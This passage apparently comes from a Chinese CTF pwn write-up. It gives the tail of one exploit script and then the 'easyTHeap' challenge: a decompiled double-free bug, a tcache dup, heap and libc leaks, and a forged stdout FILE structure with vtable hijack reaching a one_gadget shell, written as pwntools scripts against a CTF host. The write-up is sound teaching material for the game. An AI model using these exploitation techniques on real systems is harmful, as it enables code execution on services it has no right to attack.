            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''</span>
</code></pre>
<h1 id="easyTHeap"><a href="#easyTHeap" class="headerlink" title="easyTHeap"></a>easyTHeap</h1><h2 id="来源-6"><a href="#来源-6" class="headerlink" title="来源"></a>来源</h2><p>v &amp; n</p>
<h2 id="难度-5"><a href="#难度-5" class="headerlink" title="难度"></a>难度</h2><p>4 / 10</p>
<h2 id="保护-6"><a href="#保护-6" class="headerlink" title="保护"></a>保护</h2><pre><code>   Arch:     amd64-64-little
   RELRO:    Full RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      PIE enabled</code></pre>
<h2 id="简单描述-5"><a href="#简单描述-5" class="headerlink" title="简单描述"></a>简单描述</h2><p>该环境为glibc 2.27, 有teache机制.题中有五个功能,利用有限制,malloc只能7次以下, free 3次以下.</p>
<h2 id="vul-7"><a href="#vul-7" class="headerlink" title="vul"></a>vul</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"idx?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">inputNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">6</span> <span class="token operator">||</span> <span class="token operator">!</span>heap_array<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>heap_array<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  size_array<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">// not set ptr as null, can be double free</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>拥有uaf漏洞,可以使用teache机制double free任意地址分配.</p>
<h2 id="打法1"><a href="#打法1" class="headerlink" title="打法1"></a>打法1</h2><p>评估: </p>
<p>复杂度: 比较复杂  成功率: 低</p>
<h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><p>tcache, IO_FILE</p>
<h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>程序中限制了<code>malloc</code>和<code>free</code>的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址, 然后通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址,实现任意地址分配.修改IO_2_1_stdout结构, 实现IO流对vtable的调用来触发one_gadget.</p>
<h3 id="利用-7"><a href="#利用-7" class="headerlink" title="利用"></a>利用</h3><h4 id="准备-3"><a href="#准备-3" class="headerlink" title="准备"></a>准备</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: I0gan</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

exeFile <span class="token operator">=</span> <span class="token string">'vn_pwn_easyTHeap'</span>
libFile <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"node3.buuoj.cn"</span>
remotePort <span class="token operator">=</span> <span class="token number">28200</span>


LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIB   <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token comment" spellcheck="true"># 这里由于直接查找_IO_str_jumps找不到,可以采取这样的办法查找_IO_str_jumps,也可以通过调试直接找.</span>
<span class="token keyword">def</span> <span class="token function">get_IO_str_jumps_offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    IO_file_jumps_offset <span class="token operator">=</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_file_jumps'</span><span class="token punctuation">]</span>
    IO_str_underflow_offset <span class="token operator">=</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_str_underflow'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> ref_offset <span class="token keyword">in</span> lib<span class="token punctuation">.</span>search<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>IO_str_underflow_offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        possible_IO_str_jumps_offset <span class="token operator">=</span> ref_offset <span class="token operator">-</span> <span class="token number">0x20</span>
        <span class="token keyword">if</span> possible_IO_str_jumps_offset <span class="token operator">></span> IO_file_jumps_offset<span class="token punctuation">:</span>
            <span class="token keyword">return</span> possible_IO_str_jumps_offset

<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">md</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    </code></pre>
<h4 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h4><pre class=" language-python"><code class="language-python">    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 0</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 1</span>

    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># double free使fd指向自己,下次开辟可以通过修改fd实现任意地址分配</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># leak heap addr</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 打印自己本身地址</span>
    heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x260</span>
    li<span class="token punctuation">(</span><span class="token string">'heap_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址, 那么怎样才能不满足呢,由于程序中最多只能分配7次,就不能使tcache bin的数量大于7了,那只能小于0,怎样才能小于0, 就采用tcache double free之后,就已经形成一个环,若没有修改fd,就一直在原地分配,分配成功后tcache bin的count - 1,当tcache bin的count小于0时,再次释放任何堆,就不会到tcache bin中了.</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># 一直开辟,直到count 小于0</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2 for ajust</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>
    <span class="token comment" spellcheck="true"># 这里count 为-1,若开辟后释放,就不会到tcache bin中了</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># leak heap addr</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 当前的fd就是自己本身的地址,泄漏出heap地址</span>
    heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x260</span>
    li<span class="token punctuation">(</span><span class="token string">'heap_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h4 id="实现任意地址写入"><a href="#实现任意地址写入" class="headerlink" title="实现任意地址写入"></a>实现任意地址写入</h4><p>这里只需修改chunk 0的fd指向我们想要的地方,再次开辟,就会到我们想要修改的地方.</p>
<pre class=" language-python"><code class="language-python">    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>_IO_2_1_stdout_<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#修改chunk 0,(因为前几次分配都是重叠在一块chunk上的)的fd指向stdout</span>
    md<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 5 for ajust</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 6, 开辟到stdout</span></code></pre>
<p>上面任意地址写入已经实现,如果改写malloc_hook或者free_hook,可以改写成功,但是没有办法触发.这是因为，已经用完了add功能的7次调用,delete功能的3次调用,因此,接下来,就调用不了malloc或free,也就无法触发了.因此,可以劫持_IO_2_1_stdout_的虚表.通过IO流对虚表的调用来触发one_gadget.由于glibc为2.29,因此不能直接伪造虚表,而应该将虚表劫持为_IO_str_jumps_附近</p>
<pre><code>   0x00007f1fda7b1a65 &lt;+165&gt;:    lea    rdx,[rip+0x366cf4]        # 0x7f1fdab18760     &lt;_IO_helper_jumps&gt;
   0x00007f1fda7b1a6c &lt;+172&gt;:    lea    rax,[rip+0x367a55]        # 0x7f1fdab194c8
   0x00007f1fda7b1a73 &lt;+179&gt;:    sub    rax,rdx
   0x00007f1fda7b1a76 &lt;+182&gt;:    mov    rcx,r13
   0x00007f1fda7b1a79 &lt;+185&gt;:    sub    rcx,rdx
   0x00007f1fda7b1a7c &lt;+188&gt;:    cmp    rax,rcx
   0x00007f1fda7b1a7f &lt;+191&gt;:    jbe    0x7f1fda7b1b40 &lt;_IO_puts+384&gt;
   0x00007f1fda7b1a85 &lt;+197&gt;:    mov    rdx,rbx
   0x00007f1fda7b1a88 &lt;+200&gt;:    mov    rsi,r12
   0x00007f1fda7b1a8b &lt;+203&gt;:    call   QWORD PTR [r13+0x38] #调用虚表</code></pre>
<p>只需要让[r13+0x38]为IO_str_finish函数的指针即可,因此，需要将虚表修改为IO_str_jumps – XX,使得,r13+0x38正好对应上<em>IO_str_finish指针, 而IO_str_finish函数会call [_IO_2_1_stdout</em> + 0xE8]</p>
<p>call的前提是_IO_2_1_stdout_的flag的低1字节要为0. 综上,需要劫持<em>IO_2_1_stdout_结构体,修改flags,劫持虚表为IO_str_jumps – XX,修改_IO_2_1_stdout</em>+0xE8处为one_gadget.然后puts的调用即可触发one_gadget</p>
<h4 id="修改IO-2-1-stdout结构体"><a href="#修改IO-2-1-stdout结构体" class="headerlink" title="修改IO_2_1_stdout结构体"></a>修改IO_2_1_stdout结构体</h4><pre class=" language-python"><code class="language-python">    p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad2886</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 要覆盖flag的最低bit为0</span>
    <span class="token comment" spellcheck="true">#中间数据保持不变</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>_IO_2_1_stdout_ <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">7</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>_IO_2_1_stdout_ <span class="token operator">+</span> <span class="token number">0x201</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># file num</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000a000000</span><span class="token punctuation">)</span>
    _IO_stdfile_1_lock <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7ff3095508c0</span> <span class="token operator">-</span> <span class="token number">0x7ff309163000</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>_IO_stdfile_1_lock<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    _IO_wide_data_1 <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7f2fc336a8c0</span> <span class="token operator">-</span> <span class="token number">0x7f2fc2f7f000</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>_IO_wide_data_1<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#修改对应IO_str_finish函数指针,该函数会调用IO_2_1_stdout_+0xE8处的函数指针</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vtable_jump<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># IO_2_1_stdout_+0xE8处只需修改为one_gadget</span>
    md<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span></code></pre>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp-1"></a>exp-1</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: I0gan</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

exeFile <span class="token operator">=</span> <span class="token string">'vn_pwn_easyTHeap'</span>
libFile <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"node3.buuoj.cn"</span>
remotePort <span class="token operator">=</span> <span class="token number">28200</span>


LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIB   <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">get_IO_str_jumps_offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    IO_file_jumps_offset <span class="token operator">=</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_file_jumps'</span><span class="token punctuation">]</span>
    IO_str_underflow_offset <span class="token operator">=</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_str_underflow'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> ref_offset <span class="token keyword">in</span> lib<span class="token punctuation">.</span>search<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>IO_str_underflow_offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        li<span class="token punctuation">(</span><span class="token string">'AA'</span><span class="token punctuation">)</span>
        possible_IO_str_jumps_offset <span class="token operator">=</span> ref_offset <span class="token operator">-</span> <span class="token number">0x20</span>
        <span class="token keyword">if</span> possible_IO_str_jumps_offset <span class="token operator">></span> IO_file_jumps_offset<span class="token punctuation">:</span>
            <span class="token keyword">return</span> possible_IO_str_jumps_offset

<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">md</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
